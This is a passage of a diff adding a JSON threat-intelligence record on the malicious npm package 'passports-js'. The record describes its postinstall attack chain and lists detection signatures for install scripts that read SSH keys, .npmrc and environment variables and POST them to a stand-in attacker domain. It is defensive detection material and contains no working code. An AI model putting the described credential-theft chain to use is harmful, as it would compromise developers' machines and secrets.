+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "passports-js",
+                  "package_manager": "npm",
+                  "package_versions": "0.0.1-security",
+                  "why_malicious": "The package 'passports-js' (npm, version 0.0.1-security) is publicly disclosed as malicious by Datadog Security Research and OSV.dev. The package contains a postinstall script that executes embedded, likely obfuscated JavaScript code at install-time, targeting developer environments to exfiltrate sensitive files and environment variables. This behavior is consistent with supply chain attacks aiming to steal credentials or compromise developer machines."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "The malicious package is installed, triggering the postinstall script defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of malicious.js, which runs on the developer's machine."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The malicious script accesses sensitive files (e.g., ~/.ssh/id_rsa, ~/.npmrc) and environment variables.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive data is collected from the developer's environment."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The collected data is sent via HTTPS POST to an attacker-controlled server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives developer secrets and credentials, enabling further compromise."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of postinstall scripts that perform outbound network requests during npm install",
+                    "Access to sensitive files (e.g., ~/.ssh/id_rsa, ~/.npmrc) or environment variables in install scripts",
+                    "Presence of obfuscated or non-human-readable JavaScript in postinstall scripts"
+                  ],
+                  "file_indicators": [
+                    "package.json with a postinstall script referencing a local JavaScript file (e.g., 'node malicious.js')",
+                    "Presence of files named malicious.js or similarly suspicious scripts in the package root",
+                    "Embedded JavaScript code that reads sensitive files or environment variables"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to unknown or attacker-controlled domains (e.g., attacker.example.com) during npm install"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that invoke local JavaScript files. Flag packages where install-time scripts access sensitive files (such as ~/.ssh/id_rsa, ~/.npmrc) or environment variables, and make outbound network requests to untrusted domains. Use static analysis to detect obfuscated code in postinstall scripts. Correlate findings with threat intelligence sources such as OSV.dev and public security advisories."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
